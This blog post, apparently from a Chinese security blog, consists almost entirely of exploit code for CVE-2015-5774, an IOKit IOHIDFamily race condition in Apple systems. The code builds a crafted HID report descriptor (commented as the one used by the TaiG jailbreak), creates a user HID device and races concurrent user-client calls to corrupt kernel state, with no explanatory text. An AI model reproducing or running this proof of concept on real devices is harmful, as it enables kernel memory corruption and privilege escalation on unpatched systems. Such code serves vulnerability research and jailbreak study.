---
layout: post
title: CVE-2015-5774利用代码
---
{% highlight bash %}
#import <Foundation/Foundation.h>
#include <stdio.h>
#include <stdlib.h>
#include <mach/mach_host.h>
#include <mach/mach_port.h>
#include <IOKit/IOKitLib.h>
#include <IOKit/IOCFSerialize.h>
#include <IOKit/IODataQueueClient.h>
#include <pthread/pthread.h>
#define NSLog(FORMAT,args...) printf("%s\n",[[NSString stringWithFormat:FORMAT,args]UTF8String])
{% endhighlight %}

kern_return_t ret;
io_connect_t hid_connect;

void input_data(void *arg);
int updateElementValuesCall(void);

int main (int argc, const char * argv[])
{
    
    CFMutableDictionaryRef cfdic = CFDictionaryCreateMutable(kCFAllocatorDefault,0x0, &kCFTypeDictionaryKeyCallBacks,&kCFTypeDictionaryValueCallBacks);
    void *byte = malloc(0x1000);
    memset(byte,0x00,0x161);
    input_data(byte);
    CFDataRef data = CFDataCreate(kCFAllocatorDefault,byte,0x161);
    CFStringRef str = CFSTR("ReportDescriptor");
    CFDictionarySetValue(cfdic,str,data);
    CFDataRef list_data = CFPropertyListCreateData(kCFAllocatorDefault,cfdic,0x64,0x0,NULL);
    void *z_data = malloc(0x3000);
    memset(z_data,0x0,0x3000);
    memcpy(z_data,CFDataGetBytePtr(list_data),CFDataGetLength(list_data));
    //FILE *_f = fopen("/test/test.txt","wb");
    //fwrite(z_data,strlen(z_data),1,_f); 导出IOHID描述符
    
    CFDictionaryRef dic = IOServiceMatching("IOHIDResource");
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,dic);
    
    io_connect_t IOHIDResource_connect;
    if(service==0){
        printf("service is 0\n");
        exit(1);
    }
    ret = IOServiceOpen(service, mach_task_self(),0,&IOHIDResource_connect);
    printf("IOHIDResource:IOServiceOpen ret is %x\n",ret);
    printf("connect is %x\n",IOHIDResource_connect);
    
    natural_t obj_typ;
    mach_vm_address_t obj_add;
    if(mach_port_kobject(mach_task_self(),IOHIDResource_connect,&obj_typ,&obj_add)==KERN_SUCCESS){
        
        UInt64 input=0;
        printf("strnlem is %zu\n",strnlen((char *)z_data,0x30000));
        ret = IOConnectCallMethod(IOHIDResource_connect,0,&input,0x1,z_data,strlen(z_data)+1,NULL,NULL,NULL,NULL);
        printf("IOConnectCallMethod:0x%x\n",ret);
        if(ret!=KERN_SUCCESS){
            exit(1);
        }
    }else{
        printf("Create IOHIDUserDevice: mach_port_kobject !=0\n");
    }
    
    printf("*****Create IOHIDUserDevice*****Success\n");
    
    
    io_iterator_t iterator;
    io_service_t hid_service = 0;
    if(IOConnectGetService(IOHIDResource_connect,&hid_service)!=KERN_SUCCESS){
        printf("IOConnectGetService faild :return 0\n");
        exit(1);
    }
    
    if(IORegistryEntryCreateIterator(hid_service,kIOServicePlane,0x0,&iterator)!=KERN_SUCCESS){
        printf("IORegistryEntryCreateIterator faild\n");
        exit(1);
    }
    
    io_service_t libUser = IOIteratorNext(iterator);
    
    CFMutableDictionaryRef properties;
    ret = IORegistryEntryCreateCFProperties(libUser,&properties,kCFAllocatorDefault,0);
    if(ret!=KERN_SUCCESS){
        printf("IORegistryEntryCreateCFProperties faild\n");
        exit(1);
    }
    ret = IORegistryIteratorEnterEntry(iterator);
    libUser = IOIteratorNext(iterator);
    IORegistryEntryCreateCFProperties(libUser,&properties,kCFAllocatorDefault,0);
    printf("success class is %s\n",CFStringGetCStringPtr(IOObjectCopyClass(libUser),kCFStringEncodingUTF8));
    //NSLog(@"%@",(__bridge NSDictionary*)properties);
    ret = IOServiceOpen(libUser,mach_task_self(),0,&hid_connect);
    if(ret!=KERN_SUCCESS){
        printf("IOHIDUserDevice: IOServiceOpen ret is %d\n",ret);
        exit(1);
    }
    printf("*****get IOHIDUserDevice connect*****Success\n");
    
    mach_vm_address_t atAddress = 0;
    mach_vm_size_t ofSize = 0;
    
    IOConnectMapMemory(IOHIDResource_connect,0,mach_task_self(),&atAddress,&ofSize,kIOMapAnywhere);
    
    
    uint32_t DataQueue_dataSize = 0;
    if(IODataQueuePeek(atAddress)!=0){
        do{
            DataQueue_dataSize = 0;
            IODataQueueDequeue(atAddress,0x0,&DataQueue_dataSize);
        }while (IODataQueuePeek(atAddress)!=0);
    }
    
    uint64_t input[2] = {0,0};
    void *inputStruct = malloc(0x130);
    memset(inputStruct,0xAA,0x130);
    size_t inputStructCnt = 0x130;
    
    pthread_t thread_res = 0;
    
    ret = pthread_create(&thread_res,0,(void *(*)(void *))&updateElementValuesCall,0);
    if(ret!=0){
        printf("pthread_create faild\n");
        exit(1);
    }
    int alright_done = 0;
    int i = 0;
    do{
        usleep(0x7d0);
        if(IODataQueuePeek(atAddress)!=0){
            ret = IOConnectCallMethod(IOHIDResource_connect,0x3,input,0x2,inputStruct,inputStructCnt,NULL,NULL,NULL,NULL);
            if(ret==KERN_SUCCESS){
                input[0] = 0;
                input[1] = 1;
            }
            else{
                printf("IOHIDResource call 0x3 faild\n");
                exit(1);
            }
            alright_done++;
            IODataQueueDequeue(atAddress,0x0,&DataQueue_dataSize);
            if(alright_done>=2) break;
        }
        i++;
    }while(i<=9);
    
    if(alright_done==2){
        printf("Success:index:0x%x\n",i);
    }
    
    sleep(3);
    return 0;
}

int updateElementValuesCall(){
    
    uint64_t update_input[2] = {0x2,0x2}; //太极为{0x2,0x82}
    uint32_t update_outputCnt = 0;
    
    ret = IOConnectCallScalarMethod(hid_connect,0xa,update_input,0x2,NULL,&update_outputCnt);
    if(ret!=KERN_SUCCESS){
        printf("IOConnectCallScalarMethod faild:0x%x\n",ret);
        exit(1);
    }
    else{printf("*****IOHIDLibUserClient::_updateElementValues*****Success\n");
    }
    return 0;
}

void input_data(void *arg) {
    char byte[] = {0x07,0xfe,0xff,0xff,0xff,0x27,0xff,0xff,0xff,0xff,0x17,0xff,0xff,0xff,0xff,0x47,0xff,0xff,0xff,0xff,0x37,0xff,0xff,0xff,0xff,0xa7,0x00,0x00,0x00,0x00,0xb7,0x00,0x00,0x00,0x00,0xa3,0xfd,0xff,0xff,0xff,0x07,0x00,0x00,0x00,0x00,0x0a,0x00,0x00,0x27,0x00,0x00,0x00,0x00,0x17,0x00,0x00,0x00,0x00,0x47,0x00,0x00,0x00,0x00,0x37,0x00,0x00,0x00,0x00,0x67,0x00,0x00,0x00,0x00,0x57,0x00,0x00,0x00,0x00,0x77,0x08,0x00,0x00,0x00,0x97,0x7f,0x00,0x00,0x00,0x87,0x01,0x00,0x00,0x00,0x93,0x03,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x0a,0x00,0x00,0x27,0x00,0x00,0x00,0x00,0x17,0x00,0x00,0x00,0x00,0x47,0x00,0x00,0x00,0x00,0x37,0x00,0x00,0x00,0x00,0x67,0x00,0x00,0x00,0x00,0x57,0x00,0x00,0x00,0x00,0x77,0x08,0x00,0x00,0x00,0x97,0x7f,0x00,0x00,0x00,0x87,0x02,0x00,0x00,0x00,0x93,0x03,0x00,0x00,0x00,0xc3,0x00,0x00,0x00,0x00};
    memcpy(arg,byte,sizeof(byte));
    //这段是太极使用的IOHID描述符,解析函数在IOHIDReportDescriptorParser.c的PrintHIDDescriptor函数
}

